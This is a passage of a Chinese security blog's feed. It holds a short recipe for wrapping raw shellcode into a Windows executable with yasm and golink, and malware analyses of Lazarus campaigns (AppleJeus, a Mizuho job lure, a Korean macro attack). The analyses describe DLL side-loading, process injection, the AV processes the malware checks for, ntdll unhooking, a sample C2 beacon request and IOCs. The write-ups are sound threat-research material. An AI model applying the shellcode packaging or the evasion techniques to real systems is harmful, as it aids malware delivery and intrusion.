&lt;h1 id=&quot;2-流程图&quot;&gt;&lt;a href=&quot;#2-流程图&quot; class=&quot;headerlink&quot; title=&quot;2.流程图&quot;&gt;&lt;/a&gt;2.流程图&lt;/h1&gt;&lt;img src=&quot;/post/aa66881/fef58f82dfa576b0f88d947503382451.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>将shellcode编译成可执行程序</title>
    <link href="http://shxi.cc/post/50098e1b.html"/>
    <id>http://shxi.cc/post/50098e1b.html</id>
    <published>2023-02-05T08:55:27.000Z</published>
    <updated>2023-10-17T07:00:23.069Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;创建一个asm文件,写入如下内容作为入口点用于进入shellcode并执行代码,区段名”AyyLmao”可以是任意值。shellco.bin保存实际使用的shellcode代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Global Start</span><br><span class="line">SECTION &#x27;AyyLmao&#x27; write, execute,read</span><br><span class="line">Start:</span><br><span class="line">  incbin &quot;shellcode.bin&quot; </span><br></pre></td></tr></table></figure><p>&emsp;&emsp;yasm将汇编文件编译成obj文件,-f选择是win32还是win64, -o为输出的obj文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yasm.exe -f win32 -o shellcode.obj shellcode.asm</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;程序golink生成可执行文件,程序入口点设置为汇编文件中的入口点Start。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golink /ni /entry Start shellcode.obj</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&amp;emsp;&amp;emsp;创建一个asm文件,写入如下内容作为入口点用于进入shellcode并执行代码,区段名”AyyLmao”可以是任意值。shellco.bin保存实际使用的shellcode代码&lt;/p&gt;
&lt;figure class=&quot;highlight plainte</summary>
      
    
    
    
    <category term="逆向" scheme="http://shxi.cc/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="分析技巧" scheme="http://shxi.cc/tags/%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>Lazarus分发伪装成加密货币应用程序的AppleJeus恶意软件</title>
    <link href="http://shxi.cc/post/931c000e.html"/>
    <id>http://shxi.cc/post/931c000e.html</id>
    <published>2022-12-23T06:47:51.000Z</published>
    <updated>2024-03-27T02:53:28.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;Lazarus团伙是一个长期活跃的APT组织，武器库十分强大，拥有对多平台进行攻击的能力，近年来，该团伙多次被安全厂商披露，但从未停止进攻的脚本，反而越发活跃，攻击目标也越发广泛。</p><p>&emsp;&emsp;最近有关安全研究人员观测到Lazarus使用AppleJeus变种和使用加密货币为主题的网站针对加密货币的用户，并发现在此次攻击活动中发现Lazarus在以往活动中不曾使用的新TTPs。</p><h1 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h1><h2 id="1-仿冒网站"><a href="#1-仿冒网站" class="headerlink" title="1.仿冒网站"></a>1.仿冒网站</h2><p>&emsp;&emsp;在2022年6月至今,Lazarus创建了一个与数字货币交易的网站bloxholder.com，通过进一步的对其分析发现该网站为合法网站hassonline.com克隆而来。</p><p>&emsp;&emsp;从下图可以看出两者之间的细小区别,Lazarus将原网站中与HaasOnline相关的文字引用都被替换成BloxHolder，图上半部分为合法网站，下半部分为克隆网站。</p><img src="/post/931c000e/52893a41c7a49a4619b022e10f6bc56d.png" class="" title="example"><span id="more"></span><p>&emsp;&emsp;在被克隆的网站BloxHolder还提供了伪装成加密货币应用的AppleJeus恶意程序。</p><h2 id="2-Bloxholder-msi"><a href="#2-Bloxholder-msi" class="headerlink" title="2.Bloxholder.msi"></a>2.Bloxholder.msi</h2><p>&emsp;&emsp;该文件为克隆网站上提供的有关加密货币应用的安装程序BloxHolder,实际上该文件为开源的<em>QTBitcoinTrader程序，</em>Lazarus通过将恶意程序与合法程序打包程序msi安装程序,并通过MSI安装脚本创建计划的方式间接启动恶意程序。</p><p>&emsp;&emsp;从MSI安装脚本中可以看到安装文件创建的计划任务相关信息。<br><img src="931c000e/f812071944a66f38ec63ee50974c2c9c.png"></p><p>&emsp;&emsp;该文件点击执行时弹出正常的安装界面，并没有任何异常之处。<br><img src="931c000e/4eb824aefa3d543bb13eaaddd9c63aaf.png"></p><p>&emsp;&emsp;安装完成后,该程序的界面显示如下, 主要为数字货币交易程序并提供了多个交易所接口。<br><img src="931c000e/aa9ce0121efe34de710063193b0562fb.png"></p><p>&emsp;&emsp;查看计划任务管理, 可以看到新增了一个名为”BloxHolder Update Check Task”的计划任务，当用户登录时启动由Bloxholder安装程序释放到%appdata%\BloxHolder目录下的文件CameraSettingsUIHost.exe，使用”18e190413af045db88dfbd29609eb877 lion”作为命令行参数，其中前者为加密文件文件名，lion为解密加密文件使用的异或密钥。<br><img src="931c000e/7fc064f5bcb34a8673b66f6fa101caed.png"></p><h2 id="3-侧加载利用"><a href="#3-侧加载利用" class="headerlink" title="3.侧加载利用"></a>3.侧加载利用</h2><p>&emsp;&emsp;CameraSettingsUIHost.exe为微软的合法文件,主要功能与摄像头相关。一般的恶意程序在利用侧加载技术时一般都是将恶意dll与合法的文件放在同一目录，通过这个合法文件在同一目录中加载恶意dll文件。<br><img src="931c000e/0badf08108d721478fbd5f7b4a2115e6.png"></p><p>&emsp;&emsp;而Lazarus在此次的攻击活动中在常规的侧加载利用中添加了额外的一步间接加载恶意dll文件，操作如下:<br><img src="931c000e/bb206e0c35227cef90bca66aae2dc133.png"></p><p>&emsp;&emsp;文件Duser.dll为用于劫持的恶意dll,查看其导出表可以看出与原始文件Duser.dll的导出表几乎一模一样。<br><img src="931c000e/a1c4e7b2a50b50eb890a0022493a4374.png"></p><p>&emsp;&emsp;在dll入口处读取加密文件并从命令行参数中读取用于解密的密钥”lion”,使用异或解密出AppleJeus恶意程序。<br><img src="931c000e/33fa5e32ef7de49e3cfd90a521090419.png"></p><p>&emsp;&emsp;解密后的AppleJeus通过常规方式将自身映射到内存中并执行,在映射到内存前会通过判断machine字段来判断文件为x86或x64,当machine值不为0x8664时不映射文件到内存,即只映射x64的文件到内存<br><img src="931c000e/4734fd6501e12dd25203d790382c02b7.png"></p><h2 id="4-AppleJeus恶意程序"><a href="#4-AppleJeus恶意程序" class="headerlink" title="4.AppleJeus恶意程序"></a>4.AppleJeus恶意程序</h2><p>&emsp;&emsp;该恶意程序主要功能为收集受害者机器的MAC地址、计算机名称和操作系统版本，</p><ol><li><p>1.使用API函数GetAdptersInfo获取Mac地址。<br><img src="931c000e/29de6f9c1a25eaa715d2d6031aee9b49.png"></p></li><li><p>2.使用RtlGetVersion获取受害者的操作系统版本信息。<br><img src="931c000e/dcb40b122b0b8c619adbd79947dc8fff.png"></p></li></ol><p>&emsp;&emsp;恶意程序在收集到受害者系统相关信息后,通过post请求发送到C&amp;C服务器，由C&amp;C服务器根据接收到的系统信息来决定释放投递下一阶段的payload。恶意程序向远程服务器发送的数据包如下:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /daemon/update.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">content</span>-type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">auth_timestamp</span>: &lt;当前时间戳&gt;</span><br><span class="line"><span class="attribute">auth_signature</span>: &lt;hex value&gt;</span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (X11; Linux x86_64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0.0.0</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Host</span>: bloxholder.com</span><br><span class="line"><span class="attribute">Content</span>-Length: &#123;发送数据长度&#125;</span><br><span class="line"><span class="attribute">Cache</span>-Control: no-cache</span><br><span class="line"></span><br><span class="line"><span class="attribute">rlz</span>=&#123;mac加密后的值&#125;&amp;ei=&#123;操作系统版本&#125;-&#123;用户名&#125;&amp;act=check</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;发送数据后等待C&amp;C服务器下发payload,如果数据响应码为0x200，则表示C&amp;C要下发payload，恶意程序AppleJeus解密服务器下发的payload,并将其拷贝到可执行的内存中然后执行shellcode代码。<br>&emsp;&emsp;远程服务器会根据收集的用户信息、操作系统等信息来确定目标，只有在目标符合时服务器才会下发payload。<br>&emsp;&emsp;由于是在虚拟机中执行的对应样本，因此服务器判断出不属于特定目标而不会投递payload。<br><img src="931c000e/062f702f708566e1ad68839aafab1a92.png"></p><h1 id="3-IOCS"><a href="#3-IOCS" class="headerlink" title="3.IOCS"></a>3.IOCS</h1><p>E57D8443104825AB22743C78B8F3AA<br>18644822140eda7493bd75ba1e1f235d<br>245bb604621cea7962668325995bca7c<br>bloxholder.com</p><h1 id="4-ATT-amp-CK矩阵"><a href="#4-ATT-amp-CK矩阵" class="headerlink" title="4.ATT&amp;CK矩阵"></a>4.ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Command and Control</td><td>T1105</td><td>Ingress Tool Transfer</td><td>从C&amp;C下载payload</td></tr><tr><td></td><td>T1071</td><td>Application Layer Protocol</td><td>使用http/https协议进行通信</td></tr><tr><td>Discovery</td><td>T1016</td><td>System Network Configuration Discovery</td><td>获取网络配置</td></tr><tr><td>Execution</td><td>T1204</td><td>User Execution</td><td>伪装成加密货币相关应用诱导用户执行</td></tr><tr><td></td><td>T1053</td><td>Scheduled Task/Job</td><td>创建计划任务执行恶意dll</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Lazarus团伙是一个长期活跃的APT组织，武器库十分强大，拥有对多平台进行攻击的能力，近年来，该团伙多次被安全厂商披露，但从未停止进攻的脚本，反而越发活跃，攻击目标也越发广泛。&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp;最近有关安全研究人员观测到Lazarus使用AppleJeus变种和使用加密货币为主题的网站针对加密货币的用户，并发现在此次攻击活动中发现Lazarus在以往活动中不曾使用的新TTPs。&lt;/p&gt;
&lt;h1 id=&quot;2-详细分析&quot;&gt;&lt;a href=&quot;#2-详细分析&quot; class=&quot;headerlink&quot; title=&quot;2. 详细分析&quot;&gt;&lt;/a&gt;2. 详细分析&lt;/h1&gt;&lt;h2 id=&quot;1-仿冒网站&quot;&gt;&lt;a href=&quot;#1-仿冒网站&quot; class=&quot;headerlink&quot; title=&quot;1.仿冒网站&quot;&gt;&lt;/a&gt;1.仿冒网站&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;在2022年6月至今,Lazarus创建了一个与数字货币交易的网站bloxholder.com，通过进一步的对其分析发现该网站为合法网站hassonline.com克隆而来。&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp;从下图可以看出两者之间的细小区别,Lazarus将原网站中与HaasOnline相关的文字引用都被替换成BloxHolder，图上半部分为合法网站，下半部分为克隆网站。&lt;/p&gt;
&lt;img src=&quot;/post/931c000e/52893a41c7a49a4619b022e10f6bc56d.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    <category term="APT分析报告" scheme="http://shxi.cc/categories/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    
    
    <category term="Lazarus" scheme="http://shxi.cc/tags/Lazarus/"/>
    
  </entry>
  
  <entry>
    <title>Lazarus组织以日本瑞穗銀行等招聘信息为诱饵的攻击活动分析</title>
    <link href="http://shxi.cc/post/53de2fc6.html"/>
    <id>http://shxi.cc/post/53de2fc6.html</id>
    <published>2022-12-22T01:59:01.000Z</published>
    <updated>2024-03-27T02:47:10.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h1><p>&emsp;&emsp;Lazarus是朝鲜国家资助的APT组织，该组织自成立以来一直活跃至今，因2014年11月针对索尼影视娱乐公司的攻击活动Operation Blockbuster而出名。<br>&emsp;&emsp;该组织早期主要针对政府机关，以窃取情报为主，但自2014年后，该组织开始针对全球金融机构、虚拟货币交易等位目标，并开始发动攻击以获取经济利益。近日在威胁狩猎中发现Lazarus以日本瑞穗银行（Mizuho Bank）的招聘信息为诱饵进行攻击的攻击活动，</p><h1 id="2-攻击链"><a href="#2-攻击链" class="headerlink" title="2.攻击链"></a>2.攻击链</h1> <img src="/post/53de2fc6/76334015ff4f1c0ee62489c2b2422b5c.png" class="" title="example"><span id="more"></span><h1 id="3-攻击活动分析"><a href="#3-攻击活动分析" class="headerlink" title="3. 攻击活动分析"></a>3. 攻击活动分析</h1><h2 id="1-Job-Description-vhd分析"><a href="#1-Job-Description-vhd分析" class="headerlink" title="1. Job_Description.vhd分析"></a>1. Job_Description.vhd分析</h2><p>&emsp;&emsp;vhd为虚拟磁盘格式, 在较高版本的操作系统中能够直接打开，在较低版本的系统中不能直接打开，比如win7操作系统，因此该样本主要针对使用高版本系统的用户。<br>&emsp;&emsp;Vhd文件打开后如下图，其中文件Dump.bin和Job_Description.pdf为隐藏状态，因此从受害者的角度来看文件打开后只显示Job_Description.exe文件。</p><p><img src="53de2fc6/0a88d1b4d749286469d2fd3caa57fc56.png"></p><p>为了降低受害者的警惕性，图标伪装成PDF文件,在文件名和后缀名之间使用了大量的空格，在资源管理器中不能直接看到后缀而是被用”…”代替。</p><p><img src="53de2fc6/66f0ffb6b786fa9218e981935643f447.png"></p><p>如果受害者点击执行了文件Job_Description.exe,该恶意程序会打开PDF诱饵文件展示在前台。PDF诱饵文件的主题为日本瑞穗银行（Mizuho Bank）的招聘信息。</p><p><img src="53de2fc6/90d731ff3184953279eb4cc2a912a579.png"></p><h2 id="2-Job-Descrition-exe分析"><a href="#2-Job-Descrition-exe分析" class="headerlink" title="2.Job_Descrition.exe分析"></a>2.Job_Descrition.exe分析</h2><p>恶意程序执行后,首先将文件dump.bin拷贝到目录%Templates%，并重命名为”war{当前时间戳}{随机数}”，随机数为使用当前时间戳作为随机数种子生成。</p><p><img src="53de2fc6/f64bb17d0686a90822841bc55240fc20.png"></p><p>目录%templates%主要存放word生成的本地模板,命名一般为”war{xxx}.bin”，在将dump.bin拷贝到该目录重命名后取消其隐藏属性，因为在该目录下使用该文件名很正常。</p><p><img src="53de2fc6/fc5fb3eb41878416122ff686f653e307.png"></p><p>&emsp;&emsp;读取拷贝后的dump.bin, 判断文件头是否是MZ，如果是表示该文件已经解密，直接返回;否则使用文件中第一个字节作为异或密钥，解密前1000字节数据，如果文件大小小于1000，则解密整个文件。</p><p>&emsp;&emsp;解密完成后，将解密后的首字节改成’M’来修复PE头，最后将解密的数据写入原文件起始位置。</p><p><img src="53de2fc6/2d4ab8ab0c3e3ef493c184adfea9dddc.png"></p><p>&emsp;&emsp;最后通过函数LoadLibraryW将文件加载到内存中，获取导出序号为1的导出函数并执行。</p><p><img src="53de2fc6/89862418a9522b4d6e854093ee17ef56.png"></p><h2 id="3-dump-bin分析"><a href="#3-dump-bin分析" class="headerlink" title="3.dump.bin分析"></a>3.dump.bin分析</h2><p>&emsp;&emsp;文件dump.bin为加密数据,解密后为dll文件。由文件Job_Descrition.exe解密并执行该dll导出序号为1的导出函数。Dll文件执行后首先读取自身文件尾部的4字节数据作为加密配置信息在文件中的偏移值，然后使用标准的RC4解密算法解密出配置数据。</p><p><img src="53de2fc6/78d3b3c8106772c10905108643aec3df.png"></p><p>解密后的值为:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hxxps:<span class="regexp">//</span>azure.protection-</span><br><span class="line">service.cloud<span class="regexp">/GJ4EDAp_dNg/</span>lIHlIP4QM7<span class="regexp">/GQKGPNuo4R/</span>c5njZjK9Tq<span class="regexp">/J7rC%2BBrm/</span></span><br><span class="line">ZoQVg%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;解密完配置信息后,遍历当前运行的进程快照，检测系统中是否包含安全产商安全软件相关的进行。若存在则设置对应的全局变量值为1。</p><p><img src="53de2fc6/4ffaad2157400f3660c3120e0a966aae.png"></p><p>检测的进程名如下:</p><table><thead><tr><th>进程名</th><th>所属软件</th></tr></thead><tbody><tr><td>SavService.exe</td><td>Sophos Anti-Virus Software</td></tr><tr><td>avp.exe</td><td>卡巴斯基杀毒软件</td></tr><tr><td>klnagent.exe</td><td>卡巴斯基杀毒软件</td></tr><tr><td>AvastSvc.exe</td><td>Avast杀毒软件</td></tr><tr><td>AvastUI.exe</td><td>Avast杀毒软件</td></tr><tr><td>avguard.exe</td><td>杀毒软件小红伞(Avira)</td></tr><tr><td>SentryEye.exe</td><td>Avira Product Family</td></tr><tr><td>bdagent.exe</td><td>BitDefender Professional</td></tr><tr><td>vsserv.exe</td><td>Bull Guard网络安全套装</td></tr><tr><td>coreServiceShell.exe</td><td>趋势杀毒软件</td></tr><tr><td>uiSeAgnt.exe</td><td>趋势科技Worry-Free Business Security</td></tr><tr><td>MsMpEng.exe</td><td>Windows Defender</td></tr></tbody></table><p>&emsp;&emsp;当系统中存在趋势科技、BitDefender、WindowsDefender其中之一的进程时，则重载ntdll.dll，以取消杀软对ntdll.dll的hook，从而绕过杀软监测。<br>当进程中存在与 趋势科技、BitDefender、WindowsDefender相关的进程时,重载加载的ntdll模块，用于绕过这些进程对ntdll的监控。<br><img src="53de2fc6/bdbaf27190b3005f8ad913fd29b8aeac.png"></p><p>重载代码如下:<br><img src="53de2fc6/80be64511a991416173b39e93e4529d9.png"></p><p>检测互斥量是否已经被创建用于避免恶意程序被重复执行。<br><img src="53de2fc6/3beaddbda3e4aea94ea360a62243173e.png"></p><p>&emsp;&emsp;恶意程序在运行中会根据受害者计算机中安装的安全软件进程使用不同的策略来绕过检测。当解密的配置数据不是以”http”开头的url地址或者恶意程序已经在执行的情况下只执行打开诱饵文档的操作。<br><img src="53de2fc6/ec0d8271cff1bd7bb4a0d9e202d6e04a.png"></p><p>&emsp;&emsp;若存在BitDefender、WindowsDefender相关进程时通过timeout延迟10秒执行，然后使用rundll32.dll调用自身模块序号为1的导出函数。<br><img src="53de2fc6/a05b604082c0e5a72488c70507f02368.png"></p><p>恶意程序通过使用curl来从解密后的链接中下载后续的payload，如果目标系统中使用了代码，则curl使用参数”-x”来添加对应的代理。<br><img src="53de2fc6/21c6f7d259ff405cc828c04f7720f87e.png"></p><p>创建匿名管道从进程curl的执行结果中读取数据。<br><img src="53de2fc6/fe7b8c7bcf4eeb49d5f143d42baf43ef.png"></p><p>从远程服务器下载的payload被伪装成html网页，因此在下载完成后需要验证数据头部是否为”&lt;html&gt;”来确定下载的数据是否有效。<br><img src="53de2fc6/8a549fa35eef5bb92ac54340fec1198d.png"></p><p>在伪装的html数据中偏移0x40开始处才是真正的payload数据。该数据使用RC4加密算法加密。<br><img src="53de2fc6/75ea1f69ce1339fd0a477dd31c365834.png"></p><p>若存在Avria或Avast时，将解密后的数据写入文件marcoor.dll，并用rundll32.dll调用其导出函数；否则创建远程线程将数据解密后的文件注入到进程explorer中。<br><img src="53de2fc6/857851d51dcf203cbab3c5ac898a80ac.png"></p><p>恶意程序使用的远程线程代码注入如下:<br><img src="53de2fc6/40edcac130e1b97601b701c86e7c5b7f.png"></p><p>&emsp;&emsp;遗憾的是在分析过程中，始终无法获取到后续payload。</p><h1 id="3-IOC"><a href="#3-IOC" class="headerlink" title="3. IOC"></a>3. IOC</h1><p>hxxps://azure.protection-<br>service.cloud/GJ4EDAp_dNg/lIHlIP4QM7/GQKGPNuo4R/c5njZjK9Tq/J7rC%2BBrm/<br>ZoQVg%3D%3D<br>3CE53609211CAE4C925B9FEE88C7380E<br>931D0969654AF3F77FC1DAB9E2BD66B1<br>31E154E560DFF21F07F8AFF37BE6DE9B<br>A17E9FC78706431FFC8B3085380FE29F<br>2A7745C1B6FBC60C88487908A1D39EBB</p><h1 id="4-ATT-amp-CK矩阵"><a href="#4-ATT-amp-CK矩阵" class="headerlink" title="4. ATT&amp;CK矩阵"></a>4. ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Initial Access</td><td>T1566</td><td>Phishing</td><td>鱼叉式钓鱼</td></tr><tr><td>Execution</td><td>T1204</td><td>User Execution</td><td>通过诱饵文档诱导执行</td></tr><tr><td></td><td>T1059</td><td>Command and Scripting Interpreter</td><td>执行cmd命令</td></tr><tr><td>Command and Control</td><td>T1105</td><td>Ingress Tool Transfer</td><td>下载恶意程序</td></tr><tr><td></td><td>T1071</td><td>Application Layer Protocol</td><td>使用http协议通信</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Lazarus是朝鲜国家资助的APT组织，该组织自成立以来一直活跃至今，因2014年11月针对索尼影视娱乐公司的攻击活动Operation Blockbuster而出名。&lt;br&gt;&amp;emsp;&amp;emsp;该组织早期主要针对政府机关，以窃取情报为主，但自2014年后，该组织开始针对全球金融机构、虚拟货币交易等位目标，并开始发动攻击以获取经济利益。近日在威胁狩猎中发现Lazarus以日本瑞穗银行（Mizuho Bank）的招聘信息为诱饵进行攻击的攻击活动，&lt;/p&gt;
&lt;h1 id=&quot;2-攻击链&quot;&gt;&lt;a href=&quot;#2-攻击链&quot; class=&quot;headerlink&quot; title=&quot;2.攻击链&quot;&gt;&lt;/a&gt;2.攻击链&lt;/h1&gt; &lt;img src=&quot;/post/53de2fc6/76334015ff4f1c0ee62489c2b2422b5c.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    
    <category term="Lazarus" scheme="http://shxi.cc/tags/Lazarus/"/>
    
  </entry>
  
  <entry>
    <title>疑似Lazarus组织针对韩国的攻击活动分析</title>
    <link href="http://shxi.cc/post/46cb6af1.html"/>
    <id>http://shxi.cc/post/46cb6af1.html</id>
    <published>2022-11-17T17:54:17.000Z</published>
    <updated>2023-10-17T07:06:52.517Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.   概述"></a>1.   概述</h1><p>&emsp;&emsp;Lazarus组织，又称为HIDDEN COBRA、APT38、Zinc、Guardians of Peace等，是半岛地区最活跃的APT组织之一。该组织的攻击目标涉及波兰、智利、美国、墨西哥、巴西等数十个国家，针对银行、比特币交易所等金融机构及个人实施定向攻击活动，以获取经济利益，堪称全球金融机构的最大威胁之一。<br>&emsp;&emsp;此外，该组织还针对航空航天、COVID-19疫苗技术、政府、媒体等机构及企业进行渗透，以窃取重要资料并进行破坏勒索。</p><h1 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h1><h2 id="1-诱饵文档"><a href="#1-诱饵文档" class="headerlink" title="1.诱饵文档"></a>1.诱饵文档</h2><p>&emsp;&emsp;SaniTox是韩国Jiransecurity的一款反病毒程序, 诱饵文档伪冒SaniTox骗取受害者信任并诱导其启用宏功能以便执行恶意宏代码。<br> <img src="/post/46cb6af1/clip_image001.png" class="" title="example"></p><span id="more"></span><p>&emsp;&emsp;文档主题为<strong>如何进入网络教室的操作手册</strong>,如下图:<br><img src="46cb6af1/clip_image003.png"></p><p>&emsp;&emsp;该诱饵文档包括远程模板注入,当受害者打开文档时加载远程模板, 然后执行模板文件的恶意宏代码并下载IEUpdate.exe分析。<br><img src="46cb6af1/clip_image005.png"></p><h2 id="2-远程模板"><a href="#2-远程模板" class="headerlink" title="2.    远程模板"></a>2.    远程模板</h2><p>&emsp;&emsp;远程模板包含恶意宏代码,主要从服务器下载恶意文件并注入到WinWord进程中执行。<br>&emsp;&emsp;当远程模板被加载时,  首先执行函数Auto_Open,  首先检测文档是否在沙箱被打开,如果是则关闭文档。否则就从远程服务器中下载恶意文件并注入到WinWord进程内。<br>&emsp;&emsp;如果注入进程失败,则弹出错误提示。注入成功则将最开始显示的诱导启动宏功能的页面隐藏，显示主题为 <strong>如何进入网络教室的操作手册</strong>的内容。<br><img src="46cb6af1/clip_image007.png"></p><p>&emsp;&emsp;当Auto_Open函数执行失败, 宏代码中还实现一种当WindowsMediaPlyer控件状态改变时被触发。主要代码与Auto_Open函数类似。<br><img src="46cb6af1/clip_image019.png"></p><h3 id="1-沙箱检测"><a href="#1-沙箱检测" class="headerlink" title="1.沙箱检测"></a>1.沙箱检测</h3><p>&emsp;&emsp;检测沙箱环境通过比较短时间内的Tick值来判断, 如果值小于50则处于沙箱环境中。<br><img src="46cb6af1/clip_image011.png"></p><h3 id="2-下载文件"><a href="#2-下载文件" class="headerlink" title="2.下载文件"></a>2.下载文件</h3><p>&emsp;&emsp;从远程下载服务器, 对于Win32和Win64系统使用不同的文件, 下载的文件数据使用Base64编码,解码后将文件注入到WinWord进程中。<br><img src="46cb6af1/clip_image013.png"></p><h3 id="2-注入进程"><a href="#2-注入进程" class="headerlink" title="2.注入进程"></a>2.注入进程</h3><p>&emsp;&emsp;宏代码中实现了对x86/x64进程的注入, 与其他恶意软件一样，使用创建远程线程将文件写入目标进程中，然后修改远程线程上下文将EIP地址设置为注入到目标进程的文件的入口点。如下是在注入过程中使用的函数。<br><img src="46cb6af1/clip_image015.png">         </p><p>&emsp;&emsp;获取当前打开文档的WinWord进程路径, 然后以该路径创建一个处于挂起状态的进程用于创建傀儡进程。<br><img src="46cb6af1/clip_image017.png"></p><p>&emsp;&emsp;在将文件注入到进程成功后, 修改线程上下文的EIP为文件的入口点地址, 当恢复线程时从入口点开始执行代码。<br><img src="46cb6af1/clip_image019.png"></p><p>&emsp;&emsp;注入的文件主要用于释放恶意程序IEUpdate.exe并执行，添加到注册表RUN中实现持久化。由于文件下载连接已经失效, 不能获取到有效样本并分析。</p><h2 id="3-IEUpdate分析"><a href="#3-IEUpdate分析" class="headerlink" title="3.IEUpdate分析"></a>3.IEUpdate分析</h2><p>&emsp;&emsp;该文件由注入到进程WinWord的文件释放并执行, 主要作为下载器从C&amp;C服务器中下载不同的恶意程序。</p><h3 id="1-沙箱检测-1"><a href="#1-沙箱检测-1" class="headerlink" title="1.沙箱检测"></a>1.沙箱检测</h3><p>&emsp;&emsp;判断自身模块名是否是”myapp.exe”，如果是则退出进程。该文件名为_Windows_ Defender的虚拟机引擎在模拟执行恶意程序锁使用的默认文件名。</p><p><img src="46cb6af1/clip_image021.png"></p><p>&emsp;&emsp;检测不同时间内的Tick值差值是否小于50,如果小于则退出程序。</p><p><img src="46cb6af1/clip_image023.png"></p><h3 id="2-生成标识符"><a href="#2-生成标识符" class="headerlink" title="2.生成标识符"></a>2.生成标识符</h3><p>&emsp;&emsp;恶意程序 通过向系统硬盘设备发送0x2D1400的IOCTL来获取设备序列号并与字符串”VDEVICE”, 然后使用自定义的CRC哈希算法计算哈希值，并将该值与用户名一起作为标识符。</p><p><img src="46cb6af1/clip_image025.png"></p><p>&emsp;&emsp;恶意程序使用的自定义哈希算法如下:</p><p><img src="46cb6af1/clip_image027.png"></p><h3 id="3-判断管理员权限"><a href="#3-判断管理员权限" class="headerlink" title="3.判断管理员权限"></a>3.判断管理员权限</h3><p>&emsp;&emsp;通过进程是否能在系统目录下创建目录来判断是否由管理员权限。</p><p><img src="46cb6af1/clip_image029.png"></p><h3 id="4-检测反病毒产品"><a href="#4-检测反病毒产品" class="headerlink" title="4.检测反病毒产品"></a>4.检测反病毒产品</h3><p>&emsp;&emsp;获取进程快照, 并判断当前所有运行的进程中是否包含”v3l4sp.exe”、”AYAgent.aye”、”IEUpdate.exe”。其中“v3l4sp.exe”为韩国AhnLab公司免费杀毒软件V3 Lite的组件，“AYAgent.aye”为韩国公司ESTsoft的互联网安全套件ALYac的组件。</p><p><img src="46cb6af1/clip_image031.png"></p><h3 id="5-检测自身是否已经运行"><a href="#5-检测自身是否已经运行" class="headerlink" title="5.检测自身是否已经运行"></a>5.检测自身是否已经运行</h3><p>&emsp;&emsp;检测路径为”%LocalAppData%\Microsoft\PlayReady\IEUpdate.exe”的进程是否已经运行, 如果已经运行并且与当前进程的PID不一样则结束前者进程。</p><p><img src="46cb6af1/clip_image033.png"></p><h3 id="6-检测命令行参数"><a href="#6-检测命令行参数" class="headerlink" title="6.检测命令行参数"></a>6.检测命令行参数</h3><h3 id="7-添加Windows-Defender白名单"><a href="#7-添加Windows-Defender白名单" class="headerlink" title="7.添加Windows Defender白名单"></a>7.添加Windows Defender白名单</h3><p>&emsp;&emsp;如果该恶意进程是以管理员的权限启动, 则调用powershell命令将自身加入Windows Defender的白名单中。</p><p><img 